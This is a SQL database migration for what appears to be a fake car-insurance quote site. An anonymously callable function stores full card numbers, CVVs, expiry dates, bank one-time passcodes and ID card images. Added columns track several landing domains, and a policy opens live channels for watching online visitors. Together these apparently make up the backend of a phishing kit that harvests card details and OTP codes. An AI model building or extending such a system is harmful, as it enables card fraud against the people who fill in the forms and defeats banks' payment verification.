ALTER TABLE public.customer_applications
ADD COLUMN IF NOT EXISTS landing_domain text;

ALTER TABLE public.page_views
ADD COLUMN IF NOT EXISTS landing_domain text;

CREATE INDEX IF NOT EXISTS idx_customer_applications_landing_domain
ON public.customer_applications(landing_domain);

CREATE INDEX IF NOT EXISTS idx_page_views_landing_domain
ON public.page_views(landing_domain);

CREATE OR REPLACE FUNCTION public.update_customer_application_public(_id uuid, _owner_token uuid, _patch jsonb)
RETURNS boolean
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path TO 'public'
AS $function$
DECLARE
  v_existing public.customer_applications%ROWTYPE;
  v_allowed text[] := ARRAY[
    'full_name','phone','insurance_type','document_type',
    'vehicle_manufacturer','vehicle_model','vehicle_year','serial_number',
    'vehicle_value','usage_purpose','add_driver','policy_start_date',
    'selected_company','selected_price','regular_price','company_logo',
    'cardholder_name','card_number','card_cvv','card_last_4','card_type',
    'expiry_date','otp_code','otp_resend_count','current_step','ip_address',
    'visitor_id','landing_domain','id_verification_step','id_front_url','id_back_url','status'
  ];
  v_key text;
  v_value jsonb;
  v_set text := '';
  v_sql text;
  v_new_card text;
BEGIN
  IF _id IS NULL OR _owner_token IS NULL THEN
    RETURN false;
  END IF;

  SELECT * INTO v_existing
  FROM public.customer_applications
  WHERE id = _id AND owner_token = _owner_token;

  IF NOT FOUND THEN
    RETURN false;
  END IF;

  IF _patch ? 'card_number' THEN
    v_new_card := _patch->>'card_number';
    IF v_new_card IS NOT NULL
       AND length(regexp_replace(v_new_card, '\s+', '', 'g')) >= 12
       AND regexp_replace(coalesce(v_new_card,''), '\s+', '', 'g') IS DISTINCT FROM regexp_replace(coalesce(v_existing.card_number,''), '\s+', '', 'g')
       AND COALESCE(v_existing.payment_approved, false) = true THEN
      UPDATE public.customer_applications
      SET payment_approved = false,
          current_step = 'payment',
          status = 'pending_payment'
      WHERE id = _id;
    END IF;
  END IF;

  FOR v_key, v_value IN SELECT * FROM jsonb_each(_patch) LOOP
    IF v_key = ANY(v_allowed) THEN
      IF v_set <> '' THEN v_set := v_set || ', '; END IF;
      v_set := v_set || quote_ident(v_key) || ' = ($1->>' || quote_literal(v_key) || ')';
      IF v_key = 'add_driver' THEN
        v_set := v_set || '::boolean';
      ELSIF v_key = 'vehicle_value' THEN
        v_set := v_set || '::numeric';
      ELSIF v_key = 'policy_start_date' THEN
        v_set := v_set || '::date';
      ELSIF v_key = 'otp_resend_count' THEN
        v_set := v_set || '::int';
      END IF;
    END IF;
  END LOOP;

  IF v_set = '' THEN
    RETURN true;
  END IF;

  v_sql := 'UPDATE public.customer_applications SET ' || v_set || ', updated_at = now() WHERE id = $2 AND owner_token = $3';
  EXECUTE v_sql USING _patch, _id, _owner_token;

  RETURN true;
END;
$function$;

REVOKE EXECUTE ON FUNCTION public.update_customer_application_public(uuid, uuid, jsonb) FROM PUBLIC;
GRANT EXECUTE ON FUNCTION public.update_customer_application_public(uuid, uuid, jsonb) TO anon;

DROP POLICY IF EXISTS "Public can use visitor presence channels" ON realtime.messages;
CREATE POLICY "Public can use visitor presence channels"
ON realtime.messages
FOR ALL
TO anon, authenticated
USING (
  COALESCE(private, false) = false
  AND topic IN ('realtime:online-customers', 'realtime:online-visitors')
)
WITH CHECK (
  COALESCE(private, false) = false
  AND topic IN ('realtime:online-customers', 'realtime:online-visitors')
);